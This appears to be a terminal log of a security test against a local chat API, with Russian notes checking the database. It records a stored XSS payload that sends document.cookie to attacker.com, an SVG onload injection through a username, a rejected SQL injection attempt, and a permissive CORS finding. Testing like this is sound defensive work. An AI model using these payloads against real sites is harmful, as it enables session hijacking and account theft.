$ curl -s -X POST http://127.0.0.1:8000/messages/send -H "Content-Type: application/json" -d '{"sender_id":1,"chat_id":1,"content":"<img src=x onerror=fetch(\"https://attacker.com?cookie=\"+document.cookie)>"}'
{"status":"ok","message_id":10}
→ Проверка в БД: SELECT content FROM messages WHERE message_id = 10;
   content = '<img src=x onerror=fetch("https://attacker.com?cookie="+document.cookie)>'

$ curl -s -X POST http://127.0.0.1:8000/register -H "Content-Type: application/json" -d '{"username":"<svg onload=alert(1)>xss_user","password":"pass123"}'
{"status":"ok"}
→ Проверка в БД: SELECT username FROM users WHERE username LIKE '%svg%';
   username = '<svg onload=alert(1)>xss_user'

$ curl -s -X GET "http://127.0.0.1:8000/chats/1'%20OR%20'1'='1'--"
{"detail":[{"type":"int_parsing","loc":["path","chat_id"],"msg":"Input should be a valid integer","input":"1' OR '1'='1'--"}]}

$ curl -s -H "Origin: https://evil.com" -I http://127.0.0.1:8000/register | grep -i access-control
access-control-allow-origin: *
access-control-allow-credentials: true

$ curl -s -I http://127.0.0.1:8000/register | grep -i server
server: uvicorn